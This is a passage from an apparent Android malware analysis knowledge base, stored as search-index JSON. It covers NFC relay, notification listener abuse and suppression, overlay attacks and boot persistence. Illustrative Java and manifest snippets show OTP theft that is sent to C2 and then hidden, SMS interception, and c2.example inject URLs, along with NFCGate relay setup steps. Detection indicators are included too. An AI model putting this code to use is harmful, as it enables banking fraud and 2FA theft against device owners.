timeout. This is why caching static responses and minimizing network hops is essential for a reliable relay.</p>"},{"location":"attacks/nfc-relay/#nfc-relay-vs-card-cloning","title":"NFC Relay vs Card Cloning","text":"Aspect NFC Relay Card Cloning Timing Real-time -- victim card must be present during the transaction Offline -- cloned data is used independently Authentication Defeats EMV dynamic authentication (ARQC cryptograms generated by the real card) Only works with static data (magstripe CVV, static CVC3) Data captured Full APDU conversation including dynamic cryptograms Card number, expiry, static authentication data Reusability Each transaction requires a new relay session Cloned data can be reused until card is blocked Complexity Requires two devices, relay infrastructure, real-time coordination Requires one device and a blank card or emulator Scope Works against modern chip-and-PIN and contactless EMV Limited to terminals that accept magstripe fallback or static contactless <p>EMV's core defense against cloning is the dynamic Application Cryptogram generated during <code>GENERATE AC</code>. The card uses a symmetric key shared only with the issuer to produce a cryptogram over the transaction data, including the unpredictable number from the terminal and the card's own transaction counter. An attacker who clones static card data cannot produce valid cryptograms for new transactions because they lack the card's secret key.</p> <p>Relay bypasses this entirely. The real card generates the cryptogram in response to the terminal's challenge, and the relay infrastructure simply forwards it. From the issuer's perspective, the cryptogram is valid because it was produced by the genuine card. The issuer has no way to know the card was physically in a different location than the terminal.</p>"},{"location":"attacks/nfc-relay/#extending-beyond-payment","title":"Extending Beyond Payment","text":"<p>NFC relay is not limited to payment cards. Any system that uses NFC challenge-response authentication is vulnerable.</p>"},{"location":"attacks/nfc-relay/#access-control-badges","title":"Access Control Badges","text":"<p>Corporate and government buildings use contactless smart cards (MIFARE DESFire, HID iCLASS SE) for physical access. The relay attack works identically: one device reads the victim's badge, relays APDU data to a second device at the door reader. The access control system sees valid credentials and unlocks. Unlike payment systems, most physical access systems have no transaction counter or backend authorization check, making relay even simpler.</p>"},{"location":"attacks/nfc-relay/#transit-cards","title":"Transit Cards","text":"<p>Closed-loop transit systems (Oyster, Clipper, OMNY) use NFC cards with stored value or account-linked identifiers. Relaying a transit card allows fare evasion by tapping the mule device at a turnstile while the victim's card is read remotely. Transit systems typically have weaker anti-relay protections than payment networks because the fraud value per transaction is low.</p>"},{"location":"attacks/nfc-relay/#digital-identity-documents","title":"Digital Identity Documents","text":"<p>ePassports and national ID cards (compliant with ICAO 9303) use NFC for machine-readable verification. The chip stores biometric data, personal details, and digital signatures. While Basic Access Control (BAC) and Password Authenticated Connection Establishment (PACE) protect against unauthorized reading, once the optical MRZ is known (or relay is initiated during a legitimate verification), the full chip contents can be relayed. This enables identity document relay during remote verification scenarios where the verifier expects physical document presence.</p>"},{"location":"attacks/nfc-relay/#hotel-key-cards","title":"Hotel Key Cards","text":"<p>Many modern hotel systems use NFC-based room keys issued to guests' phones or physical cards. These typically use static or weakly dynamic authentication, making them straightforward relay targets. The mule device can open doors while the victim's key is read at a different location.</p>"},{"location":"attacks/nfc-relay/#building-a-test-lab","title":"Building a Test Lab","text":"<p>Testing NFC relay detection requires a controlled environment that replicates the attack chain.</p>"},{"location":"attacks/nfc-relay/#hardware","title":"Hardware","text":"Component Purpose Notes Android device #1 (reader) Reads the target NFC card Must support NFC; acts as the \"victim-side\" relay endpoint Android device #2 (emulator) Emulates the card at a terminal using HCE Must support HCE; acts as the \"mule-side\" relay endpoint Contactless test card EMV test card from a payment card test kit or expired contactless card Do not use live payment cards for testing NFC-capable POS terminal (optional) Validates end-to-end relay against a real reader Test terminals available from payment processor dev programs"},{"location":"attacks/nfc-relay/#software","title":"Software","text":"Tool Purpose NFCGate Open-source NFC relay framework from TU Darmstadt; supports on-device relay mode and server relay mode Frida Hook Android NFC stack (<code>android.nfc.tech.IsoDep</code>) to log APDU commands during relay Wireshark + USBPcap Capture NFC traffic when using USB-connected NFC readers nfcpy (Python) Scriptable NFC library for crafting custom APDU sequences on a desktop with an ACR122U reader"},{"location":"attacks/nfc-relay/#setup-steps","title":"Setup Steps","text":"<ol> <li>Install NFCGate on both Android devices from the GitHub releases (requires root for on-device relay mode, though server relay mode works without root on some builds)</li> <li>Configure one device as \"reader\" mode and the other as \"relay\" mode</li> <li>Set the relay server address -- NFCGate supports direct device-to-device relay over a network or through an intermediary server</li> <li>Place the test card against the reader device</li> <li>Hold the emulator device against a POS terminal or use a desktop NFC reader with nfcpy to simulate terminal commands</li> <li>Observe the relayed APDU traffic in NFCGate's log view</li> <li>Measure round-trip latency per APDU exchange to determine relay viability under EMV timing constraints</li> </ol>"},{"location":"attacks/nfc-relay/#what-to-test","title":"What to Test","text":"<ul> <li>Relay latency: measure whether the full EMV transaction completes within the terminal's timeout window</li> <li>Selective caching: verify which APDU responses can be cached without breaking the transaction</li> <li>Distance limits: test maximum practical distance between reader and emulator (network-limited, not NFC-limited)</li> <li>Detection evasion: check whether relay introduces detectable timing anomalies that issuer-side fraud systems could flag</li> </ul>"},{"location":"attacks/notification-listener-abuse/","title":"Notification Listener Abuse","text":"<p>Exploiting <code>NotificationListenerService</code> to silently read, exfiltrate, and dismiss notifications from every app on the device. As Android progressively restricted SMS permissions and Google Play banned their use in most apps, malware pivoted to notification listeners as the primary channel for OTP theft, message surveillance, and evidence suppression.</p> <p>See also: Notification Suppression, SMS Interception</p> <p>Requirements</p> Requirement Details Permission <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> Grant Method User must manually enable in Settings &gt; Apps &gt; Special access &gt; Notification access Introduced API 18 (Android 4.3)"},{"location":"attacks/notification-listener-abuse/#why-malware-moved-to-notification-listeners","title":"Why Malware Moved to Notification Listeners","text":"<p>Google's January 2019 policy change restricted <code>READ_SMS</code> and <code>RECEIVE_SMS</code> to apps declared as the default SMS handler. Apps that could not justify the need were rejected from Play Store. This created a gap that notification listeners filled:</p> Factor SMS Interception Notification Listener Play Store policy Restricted since 2019 No policy restriction Runtime permission <code>RECEIVE_SMS</code> runtime prompt No runtime prompt -- Settings toggle Coverage SMS only SMS, WhatsApp, Telegram, email, authenticator apps, push notifications Real-time Yes Yes Can suppress delivery Yes (<code>abortBroadcast</code>, pre-4.4) Yes (<code>cancelNotification</code>) Works on Android 10+ Heavily restricted Fully functional"},{"location":"attacks/notification-listener-abuse/#how-it-works","title":"How It Works","text":""},{"location":"attacks/notification-listener-abuse/#service-declaration","title":"Service Declaration","text":"<p>The malware declares a <code>NotificationListenerService</code> in its manifest:</p> <pre><code>&lt;service\n    android:name=\".NLService\"\n    android:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.service.notification.NotificationListenerService\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/service&gt;\n</code></pre> <p>Once the user enables notification access, the system binds to this service and delivers every notification event.</p>"},{"location":"attacks/notification-listener-abuse/#statusbarnotification-fields","title":"StatusBarNotification Fields","text":"<p>Each callback receives a <code>StatusBarNotification</code> object. The fields malware targets:</p> Field Access Path Data Source app <code>sbn.getPackageName()</code> Identifies which app posted the notification Title <code>notification.extras.getString(EXTRA_TITLE)</code> Sender name, app name, or subject line Text <code>notification.extras.getString(EXTRA_TEXT)</code> Message body, OTP code, transaction details Big text <code>notification.extras.getString(EXTRA_BIG_TEXT)</code> Expanded notification content with full message Subtext <code>notification.extras.getString(EXTRA_SUB_TEXT)</code> Account identifiers, secondary info Post time <code>sbn.getPostTime()</code> When the notification was posted Key <code>sbn.getKey()</code> Used to dismiss specific notifications"},{"location":"attacks/notification-listener-abuse/#otp-extraction","title":"OTP Extraction","text":"<p>The core malware use case. Banking apps, email providers, and SMS all surface OTP codes in notification text. The extraction flow:</p> <pre><code>public class NLService extends NotificationListenerService {\n    @Override\n    public void onNotificationPosted(StatusBarNotification sbn) {\n        Bundle extras = sbn.getNotification().extras;\n        String text = extras.getString(Notification.EXTRA_TEXT);\n        String bigText = extras.getString(Notification.EXTRA_BIG_TEXT);\n        String content = bigText != null ? bigText : text;\n\n        if (content == null) return;\n\n        String otp = extractOtp(content);\n        if (otp != null) {\n            exfiltrateToC2(sbn.getPackageName(), otp);\n            cancelNotification(sbn.getKey());\n        }\n    }\n\n    private String extractOtp(String text) {\n        Matcher m = Pattern.compile(\"\\\\b(\\\\d{4,8})\\\\b\").matcher(text);\n        if (m.find()) return m.group(1);\n        return null;\n    }\n}\n</code></pre> <p>Malware typically filters by package name to target specific banking or authentication apps, then uses regex to pull numeric codes from the notification body. After extraction, the notification is dismissed so the user never sees it.</p>"},{"location":"attacks/notification-listener-abuse/#message-surveillance","title":"Message Surveillance","text":"<p>Messaging app notifications expose sender and preview text. WhatsApp, Telegram, Signal, and SMS all display message previews in the notification shade. The listener captures:</p> <ul> <li>WhatsApp: sender name in <code>EXTRA_TITLE</code>, message content in <code>EXTRA_TEXT</code></li> <li>Telegram: channel/contact name in title, message preview in text</li> <li>SMS/MMS: phone number or contact name in title, message body in text</li> <li>Email: subject in title, preview text in body</li> </ul> <p>For group chats, <code>EXTRA_TEXT</code> typically contains \"Sender: message\" format, giving the listener both the sender identity and content.</p>"},{"location":"attacks/notification-listener-abuse/#notification-dismissal","title":"Notification Dismissal","text":"<p><code>cancelNotification(key)</code> removes a notification from the shade. Malware uses this to:</p> <ul> <li>Hide OTP notifications after extracting the code, preventing the user from noticing the 2FA attempt</li> <li>Suppress banking transaction alerts that would reveal unauthorized transfers</li> <li>Dismiss antivirus detection notifications</li> <li>Remove Google Play Protect warnings</li> </ul> <p>The user sees nothing -- the notification appears and vanishes within milliseconds.</p>"},{"location":"attacks/notification-listener-abuse/#auto-enabling-via-accessibility","title":"Auto-Enabling via Accessibility","text":"<p>The notification listener requires manual user enablement in Settings. Malware with an active accessibility service automates this:</p> <ol> <li>Open <code>Settings</code> via intent: <code>android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS</code></li> <li>Use accessibility to find the malware's entry in the list</li> <li>Tap the toggle to enable it</li> <li>Navigate back, dismiss any confirmation dialogs</li> </ol> <p>This requires no user interaction beyond the initial accessibility service grant. Several families chain the two: accessibility enables notification listener, and both work in tandem for full device surveillance.</p>"},{"location":"attacks/notification-listener-abuse/#otp-theft-method-comparison","title":"OTP Theft: Method Comparison","text":"Method Permission Coverage Suppress Android 10+ Play Store Stealth SMS broadcast receiver <code>RECEIVE_SMS</code> SMS only Pre-4.4 only Restricted Banned Low ContentResolver SMS query <code>READ_SMS</code> Stored SMS No Restricted Banned Low Notification listener <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> All notifying apps Yes Works Allowed High Accessibility screen reading <code>BIND_ACCESSIBILITY_SERVICE</code> Full screen content No Works Scrutinized High SmsRetriever API None App-specific SMS No Works Allowed Very high <p>Notification listeners hit the sweet spot: broad coverage, ability to suppress evidence, no runtime permission dialog, and less Play Store scrutiny than accessibility services.</p>"},{"location":"attacks/notification-listener-abuse/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 4.3 (API 18) <code>NotificationListenerService</code> introduced with manual user enablement Social engineering or accessibility auto-enable Android 5.0 (API 21) <code>cancelNotification(key)</code> added for precise dismissal Malware uses this offensively to suppress evidence Android 8.0 (API 26) Notification channels provide more context Gives listeners more filtering capability, not less Android 11 (API 30) Notification history API (<code>getNotificationHistory()</code>) Listeners retroactively access recent notifications even if not running when posted Android 13 (API 33) Restricted settings for sideloaded apps; cannot direct to notification access settings Bypassed via session-based installers or store distribution Android 14 (API 34) Further tightening of restricted settings Malware adapts installer package name to appear store-distributed"},{"location":"attacks/notification-listener-abuse/#families-using-this-technique","title":"Families Using This Technique","text":"Family Notification Abuse Primary Purpose Joker Reads confirmation notifications to complete premium subscriptions silently Subscription fraud Anatsa Extracts OTPs from banking notifications during automated transfers ATS-based bank fraud Cerberus Notification-based 2FA theft as fallback when SMS interception fails Banking credential theft GodFather Monitors push notifications for OTPs across 400+ banking targets Banking fraud Mamont Push notification interception as primary OTP mechanism, avoids SMS permissions entirely Russian banking fraud Fakecalls Hides call-related notifications to maintain the illusion of a legitimate bank call VoIP call spoofing Xenomorph Notification listener for OTP capture plus message exfiltration from messaging apps Banking ATS Hook WhatsApp message exfiltration via notification interception Surveillance, banking fraud Alien First major family to use notification sniffing as a primary 2FA bypass Banking credential theft Medusa v2 dropped SMS permissions, relies on notification listener for OTP theft Banking fraud ToxicPanda Notification interception for OTP codes during on-device fraud Banking ATS Sturnus Captures notifications from encrypted messaging apps Banking fraud FireScam Intercepts notifications across all apps for broad surveillance Spyware SpyNote Full notification monitoring as part of comprehensive device surveillance RAT <p>Joker deserves special mention: it reads incoming SMS confirmation codes from notifications to silently complete WAP billing subscriptions, never needing SMS permissions and never alerting the user.</p>"},{"location":"attacks/notification-listener-abuse/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>NotificationListenerService</code> in manifest with <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> permission</li> <li>References to <code>Notification.EXTRA_TEXT</code>, <code>EXTRA_TITLE</code>, <code>EXTRA_BIG_TEXT</code></li> <li>Regex patterns targeting numeric OTP codes (4-8 digit sequences)</li> <li><code>cancelNotification()</code> or <code>cancelAllNotifications()</code> calls</li> <li>Intent action <code>ACTION_NOTIFICATION_LISTENER_SETTINGS</code> indicating automated enablement</li> </ul> Dynamic Indicators <ul> <li>App requesting notification access during installation flow</li> <li>Accessibility service navigating to notification listener settings</li> <li>Network traffic containing notification content or extracted OTP codes shortly after notification events</li> <li>Notifications disappearing from the shade faster than the user could read them</li> </ul>"},{"location":"attacks/notification-suppression/","title":"Notification Suppression","text":"<p>Hiding, dismissing, or manipulating Android notifications to prevent victims from detecting ongoing fraud. When a banking trojan initiates an unauthorized transfer, the bank sends a transaction alert via SMS or push notification. If the victim sees that alert, the operation fails. Notification suppression ensures the victim remains unaware while the attacker drains their account.</p> <p>See also: Notification Listener Abuse, SMS Interception, Automated Transfer Systems</p> <p>Requirements</p> Requirement Details Primary <code>BIND_NOTIFICATION_LISTENER_SERVICE</code> (user must enable in Settings) Alternative <code>BIND_ACCESSIBILITY_SERVICE</code> (can dismiss notifications via UI interaction) SMS suppression Default SMS handler role or <code>RECEIVE_SMS</code> with high-priority broadcast receiver"},{"location":"attacks/notification-suppression/#notification-listener-suppression","title":"Notification Listener Suppression","text":""},{"location":"attacks/notification-suppression/#how-it-works","title":"How It Works","text":"<p><code>NotificationListenerService</code> provides full read and dismiss access to all notifications on the device. Once enabled, the malware's listener receives every notification posted by any app and can:</p> <ol> <li>Read content: Extract OTP codes, transaction amounts, sender info</li> <li>Dismiss silently: Call <code>cancelNotification()</code> to remove the notification before the user sees it</li> <li>Selective filtering: Only suppress notifications from banking apps during fraud, leaving other notifications untouched to avoid suspicion</li> </ol> <pre><code>@Override\npublic void onNotificationPosted(StatusBarNotification sbn) {\n    String pkg = sbn.getPackageName();\n    if (targetBankPackages.contains(pkg)) {\n        String text = sbn.getNotification().extras\n            .getString(Notification.EXTRA_TEXT);\n        exfiltrateToC2(pkg, text);\n        cancelNotification(sbn.getKey());\n    }\n}\n</code></pre>"},{"location":"attacks/notification-suppression/#dual-purpose-theft-suppression","title":"Dual Purpose: Theft + Suppression","text":"<p>The same <code>NotificationListenerService</code> that steals OTP codes also suppresses the transaction alert that follows. This is the standard pattern in modern banking trojans: intercept the 2FA code, suppress the confirmation notification, and the victim never knows a transaction occurred.</p>"},{"location":"attacks/notification-suppression/#play-protect-suppression","title":"Play Protect Suppression","text":"<p>Google Play Protect displays warnings when it detects potentially harmful apps. Malware suppresses these warnings to prevent the user from uninstalling it.</p>"},{"location":"attacks/notification-suppression/#accessibility-based-dismissal","title":"Accessibility-Based Dismissal","text":"<p>The malware's accessibility service monitors for Play Protect warning dialogs and automatically dismisses them:</p> <ol> <li>Detect <code>com.android.vending</code> (Play Store) window with warning text</li> <li>Find and click \"Ignore\" or \"Install anyway\" button</li> <li>If prompted with \"Scan apps with Play Protect\", navigate to disable it</li> </ol> <p>Multiple families implement this as a standard module:</p> Family Technique Source Anatsa Accessibility clicks through Play Protect prompts Zscaler Cerberus Navigates to Play Protect settings, disables scanning Cyble Hook Auto-dismisses Play Protect warnings Zimperium Xenomorph Intercepts Play Protect notification ThreatFabric"},{"location":"attacks/notification-suppression/#proactive-disabling","title":"Proactive Disabling","text":"<p>Rather than waiting for warnings, some families proactively disable Play Protect:</p> <pre><code>Settings &gt; Security &gt; Google Play Protect &gt; \u2699\ufe0f &gt; Disable \"Scan apps with Play Protect\"\n</code></pre> <p>The accessibility service navigates this flow automatically. See Anti-Analysis Techniques for the full implementation.</p>"},{"location":"attacks/notification-suppression/#sms-notification-suppression","title":"SMS Notification Suppression","text":""},{"location":"attacks/notification-suppression/#default-sms-handler","title":"Default SMS Handler","text":"<p>When malware becomes the default SMS handler (via user approval or accessibility auto-grant), it receives all incoming SMS messages directly. It can process messages silently without generating any notification:</p> <ol> <li>Intercept incoming SMS</li> <li>Extract OTP or transaction alert content</li> <li>Suppress the notification entirely (never pass to the system notification handler)</li> <li>Optionally restore default SMS handler afterward to avoid suspicion</li> </ol> <p>Cerberus, Anubis, and FluBot use this approach. See Runtime Permission Manipulation for the technical flow.</p>"},{"location":"attacks/notification-suppression/#broadcast-priority-legacy","title":"Broadcast Priority (Legacy)","text":"<p>Before Android 4.4 (KitKat), any app could register an <code>SMS_RECEIVED</code> broadcast receiver with <code>android:priority=\"999\"</code> and call <code>abortBroadcast()</code> to consume the SMS before the default handler saw it. The victim's messaging app never received the SMS.</p> <pre><code>&lt;receiver android:name=\".SmsInterceptor\"&gt;\n    &lt;intent-filter android:priority=\"999\"&gt;\n        &lt;action android:name=\"android.provider.Telephony.SMS_RECEIVED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>Android 4.4 fixed this by restricting SMS delivery to the default SMS app. Post-4.4 malware must either become the default handler or use accessibility/notification listener approaches.</p>"},{"location":"attacks/notification-suppression/#push-notification-manipulation","title":"Push Notification Manipulation","text":""},{"location":"attacks/notification-suppression/#fake-notification-injection","title":"Fake Notification Injection","text":"<p>Beyond suppressing real notifications, malware generates fake notifications to drive the victim toward phishing pages:</p> <ol> <li>Create a fake notification mimicking the bank app (\"Suspicious transaction detected -- verify now\")</li> <li>Notification tap opens a WebView credential harvesting page controlled by the attacker</li> <li>Simultaneously suppress real banking notifications that might contradict the fake alert</li> </ol> <p>Ginp pioneered fake notification injection targeting Spanish banks. The trojan generated push notifications and SMS messages with any sender name and any text content, luring victims to open their banking app where Ginp's overlay would capture credentials.</p>"},{"location":"attacks/notification-suppression/#otp-capture-via-notification-reading","title":"OTP Capture via Notification Reading","text":"<p>Crocodilus uses accessibility logging to capture Google Authenticator OTP codes directly from the screen. When the C2 sends the <code>TG32XAZADG</code> command, the malware enumerates all elements displayed in the Google Authenticator app, captures OTP names and values, and exfiltrates them. This beats app-based 2FA because the code is read after generation, not intercepted in transit.</p>"},{"location":"attacks/notification-suppression/#dnd-and-sound-manipulation","title":"DND and Sound Manipulation","text":"<p>During active fraud operations (especially ATS), some families enable Do Not Disturb mode or mute the device to prevent any audible alerts:</p> <ul> <li>Set ringer mode to silent via <code>AudioManager.setRingerMode(RINGER_MODE_SILENT)</code></li> <li>Enable DND via <code>NotificationManager.setInterruptionFilter(INTERRUPTION_FILTER_NONE)</code> (requires notification policy access)</li> <li>Reduce notification volume to zero</li> </ul> <p>This is a supplementary technique used during the brief window of active fraud, not a persistent state that would alert the user.</p>"},{"location":"attacks/notification-suppression/#screen-blackout-during-fraud","title":"Screen Blackout During Fraud","text":"<p>Several families display a black overlay during remote access sessions to hide ATS activity:</p> Family Technique Octo Black screen overlay with \"SHIT_QUALITY\" reduced screenshot mode Hook Screen dimmed to zero brightness + black overlay Crocodilus Black overlay on all activities during remote control BingoMod Screen blackout during on-device fraud <p>The victim sees a black screen (appearing as if the device is off or locked) while the attacker performs transfers in the background. All notifications during this period are invisible to the user.</p>"},{"location":"attacks/notification-suppression/#families-by-suppression-capability","title":"Families by Suppression Capability","text":"Family Notification Listener SMS Suppression Play Protect Fake Notifications Screen Blackout Cerberus Yes Default SMS Yes No No Hook Yes Via accessibility Yes No Yes Octo Yes Via accessibility Yes No Yes Xenomorph Yes (<code>intercept_notification</code>) Via accessibility Yes No No Anatsa Yes No (ATS-focused) Yes No No GodFather Yes No Yes Yes No TrickMo Yes No Yes Yes No Crocodilus Yes No Yes No Yes Anubis Yes Default SMS No No No FluBot No Default SMS No No No"},{"location":"attacks/notification-suppression/#android-version-timeline","title":"Android Version Timeline","text":"Version Change Impact 4.3 <code>NotificationListenerService</code> introduced First programmatic notification access 4.4 Default SMS handler required for SMS access <code>abortBroadcast()</code> trick eliminated 5.0 Notification access requires explicit user toggle in Settings Social engineering required to enable 8.0 Notification channels introduced Apps can create low-importance channels to hide their own notifications 13 <code>POST_NOTIFICATIONS</code> requires runtime permission Malware must request or auto-grant via accessibility 13 Restricted Settings blocks sideloaded apps from notification listener Session-based installer bypass circumvents this 14 Restricted Settings expanded Session-based bypass persists"},{"location":"attacks/notification-suppression/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BIND_NOTIFICATION_LISTENER_SERVICE</code> in manifest</li> <li><code>cancelNotification()</code> or <code>cancelAllNotifications()</code> calls in notification listener</li> <li><code>Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT</code> intent for SMS handler takeover</li> <li><code>AudioManager.setRingerMode()</code> calls without user-facing audio controls</li> <li><code>NotificationManager.setInterruptionFilter()</code> for DND manipulation</li> <li>Package name lists for banking apps in notification filtering logic</li> </ul> Dynamic Indicators <ul> <li>Banking notifications appearing and immediately disappearing</li> <li>SMS messages received but no notification shown</li> <li>Play Protect warnings auto-dismissed within seconds</li> <li>Device entering silent/DND mode during banking app activity</li> <li>Black screen overlay while device is actively communicating with C2</li> </ul>"},{"location":"attacks/overlay-attacks/","title":"Overlay Attacks","text":"<p>Drawing a fake UI on top of a legitimate app to steal credentials. The defining technique of Android banking malware since ~2016. The attacker creates a window that looks identical to a banking app's login screen, and the user types their credentials into the attacker's view.</p> <p>Requirements</p> Requirement Details Permission <code>SYSTEM_ALERT_WINDOW</code> or <code>BIND_ACCESSIBILITY_SERVICE</code> Trigger Foreground app detection (knowing when to show the overlay) Payload HTML/WebView template matching the target app's UI"},{"location":"attacks/overlay-attacks/#how-it-works","title":"How It Works","text":""},{"location":"attacks/overlay-attacks/#foreground-detection","title":"Foreground Detection","text":"<p>The malware needs to know when the user opens a target app. Methods used:</p> Method Android Version Details <code>getRunningTasks()</code> Pre-5.0 Deprecated, returns only caller's tasks on 5.0+ <code>UsageStatsManager</code> 5.0+ Requires <code>PACKAGE_USAGE_STATS</code>, polls every ~1 second Accessibility events 4.1+ <code>TYPE_WINDOW_STATE_CHANGED</code> fires when any activity starts, most reliable <code>ActivityLifecycleCallbacks</code> Only for own process Not useful for monitoring other apps <p>Analyst Note</p> <p>Accessibility is the preferred method: it's real-time, requires no polling, and the malware likely needs accessibility for other purposes anyway. If a sample requests <code>BIND_ACCESSIBILITY_SERVICE</code>, treat it as the likely overlay trigger mechanism.</p>"},{"location":"attacks/overlay-attacks/#injection-display","title":"Injection Display","text":"<p>When the target app is detected, the malware displays its overlay:</p> <p>WebView approach (most common): a <code>WebView</code> loads an HTML page styled to match the target app. These HTML templates (\"injects\" or \"webfakes\") are downloaded from C2 per target app. Major malware operations maintain inject kits covering hundreds of banking apps across multiple countries.</p> <p>Native View approach: Android <code>View</code> objects constructed programmatically. Less common because it's harder to maintain across app UI updates.</p> <p>Full Activity approach: some families launch a full <code>Activity</code> with <code>FLAG_ACTIVITY_NEW_TASK</code> themed to look like the target. This doesn't require <code>SYSTEM_ALERT_WINDOW</code> but is less precise in timing.</p>"},{"location":"attacks/overlay-attacks/#credential-capture","title":"Credential Capture","text":"<p>The injected form submits entered data to C2 via HTTPS POST. Captured fields typically include:</p> <ul> <li>Login credentials (username, password)</li> <li>Card numbers (PAN, CVV, expiry)</li> <li>PINs</li> <li>Security questions</li> </ul>"},{"location":"attacks/overlay-attacks/#inject-kits","title":"Inject Kits","text":"<p>Malware-as-a-service (MaaS) operations sell or rent inject kits. An inject kit is a collection of HTML/CSS/JS files, one per target app, that mimic the target's login UI. These are versioned and updated when banks change their UI.</p> <p>The C2 server maps package names to inject URLs:</p> <pre><code>com.chase.sig.android -&gt; https://c2.example/injects/chase.html\ncom.bankofamerica.cashpromobile -&gt; https://c2.example/injects/boa.html\n</code></pre> <p>The malware downloads only injects for apps found on the device (see <code>QUERY_ALL_PACKAGES</code>).</p>"},{"location":"attacks/overlay-attacks/#evolution","title":"Evolution","text":"Era Technique Example Families 2014-2016 Simple overlays using <code>TYPE_SYSTEM_ALERT</code> GM Bot, BankBot 2016-2018 WebView-based injects, C2-managed templates Marcher, Red Alert 2018-2020 Accessibility-triggered overlays, large inject kits Cerberus, Anubis, Hydra 2020-2022 ATS (Automated Transfer System), overlay + accessibility combo Anatsa, SharkBot, Xenomorph 2022-2024 Overlays declining as primary technique, replaced by full device control via accessibility Hook, Octo/ExobotCompact 2025 On-device virtualization: real banking apps run inside malware-controlled sandbox GodFather v3 2025 NFC payment overlays: fake tap-to-pay screens capturing card data Hook v3 <p>The trend is away from pure overlay attacks toward on-device fraud using accessibility to operate the real banking app directly. Overlays are still used for initial credential capture, but the real value is in accessibility-based ATS. The most recent evolution (GodFather v3) bypasses overlays entirely by running the real banking app inside a virtual environment and intercepting all interactions at runtime.</p>"},{"location":"attacks/overlay-attacks/#android-mitigations","title":"Android Mitigations","text":"<p>Every mitigation pushed malware toward heavier reliance on accessibility services</p> Version Mitigation Bypass Android 8 <code>TYPE_APPLICATION_OVERLAY</code> renders below permission dialogs Attacker doesn't need to overlay permission dialogs Android 10 Overlays can't appear over focused app activities Accessibility gestures bypass this entirely Android 12 <code>FLAG_WINDOW_IS_PARTIALLY_OBSCURED</code> warns apps of overlays Most apps don't check this flag Android 12 Overlays untouchable over system dialogs Accessibility service performs the touches instead"},{"location":"attacks/overlay-attacks/#families-using-this-technique","title":"Families Using This Technique","text":"Family Overlay Approach Inject Kit Size Also Uses ATS Cerberus WebView 300+ targets No Anubis WebView 250+ targets No BankBot Activity 50+ targets No Hydra WebView 400+ targets No Hook WebView 400+ targets Yes GodFather WebView 400+ targets No Ermac WebView 400+ targets No Xenomorph WebView 400+ targets Yes Octo WebView 200+ targets Yes Alien WebView 200+ targets No Medusa WebView 100+ targets No SharkBot Native 20+ targets Yes Zanubis WebView 40+ targets Yes Fakecalls WebView Korean banks No Mamont WebView Russian banks No Copybara WebView Italian banks Yes Crocodilus WebView 8 countries Yes BingoMod WebView European banks Yes Brokewell WebView European banks Yes Klopatra WebView Turkish banks Yes Albiriox WebView 400+ targets Yes Herodotus WebView Southern/Central EU Yes GoldPickaxe WebView Thai/Vietnamese banks No Sturnus WebView Southern/Central EU Yes Antidot WebView Multi-language Yes TrickMo WebView European banks No TsarBot WebView 750+ targets Yes BlankBot WebView Turkish banks Yes Vultur Native European banks Yes Chameleon WebView AU/EU banks No ToxicPanda WebView EU/LATAM banks Yes Frogblight WebView Turkish banks Yes BTMOB RAT WebView injection (<code>brows</code> command) Crypto/banking Yes Rafel RAT Activity-based Multi-region No RatOn WebView Czech banks Yes DeVixor WebView Iranian banks No <p>Notable exceptions: Gigabud and Vultur v1 deliberately avoid overlay attacks, using screen recording instead to capture credentials as the victim interacts with their real banking app. NGate uses a phishing WebView for card PIN entry rather than traditional banking overlays.</p>"},{"location":"attacks/overlay-attacks/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>SYSTEM_ALERT_WINDOW</code> in manifest</li> <li><code>TYPE_APPLICATION_OVERLAY</code> in code</li> <li><code>UsageStatsManager</code> calls for foreground detection</li> <li>WebView loading local HTML or C2-hosted URLs</li> <li>Accessibility service monitoring <code>TYPE_WINDOW_STATE_CHANGED</code></li> </ul> Dynamic Indicators <ul> <li>Window created with overlay type when a banking app is foregrounded</li> <li>Network request to C2 matching pattern of inject download</li> <li>HTML files stored in app's internal storage matching banking app names</li> </ul>"},{"location":"attacks/persistence-techniques/","title":"Persistence Techniques","text":"<p>Surviving device reboots, app kills, and user attempts at removal. Android's process lifecycle aggressively terminates background apps to conserve resources, so malware must actively fight to stay alive. The most resilient families layer multiple persistence mechanisms, ensuring that if one is killed, another restarts it.</p> <p>Requirements</p> Requirement Details Boot persistence <code>RECEIVE_BOOT_COMPLETED</code> (normal permission, auto-granted) Background execution <code>FOREGROUND_SERVICE</code> (normal permission, auto-granted) Battery exemption <code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code> Anti-uninstall <code>BIND_DEVICE_ADMIN</code> (requires user activation) Self-restart <code>BIND_ACCESSIBILITY_SERVICE</code> (system manages lifecycle)"},{"location":"attacks/persistence-techniques/#boot-receiver","title":"Boot Receiver","text":"<p>The simplest and most common persistence method. Registering a <code>BroadcastReceiver</code> for <code>BOOT_COMPLETED</code> causes Android to start the malware's component every time the device boots.</p> <pre><code>&lt;receiver android:name=\".BootReceiver\"\n    android:enabled=\"true\"\n    android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.BOOT_COMPLETED\" /&gt;\n        &lt;action android:name=\"android.intent.action.QUICKBOOT_POWERON\" /&gt;\n        &lt;action android:name=\"com.htc.intent.action.QUICKBOOT_POWERON\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <pre><code>public class BootReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        Intent serviceIntent = new Intent(context, MalwareService.class);\n        if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.O) {\n            context.startForegroundService(serviceIntent);\n        } else {\n            context.startService(serviceIntent);\n        }\n    }\n}\n</code></pre> <p>Multiple boot actions are registered because some OEMs (HTC, Xiaomi) fire vendor-specific 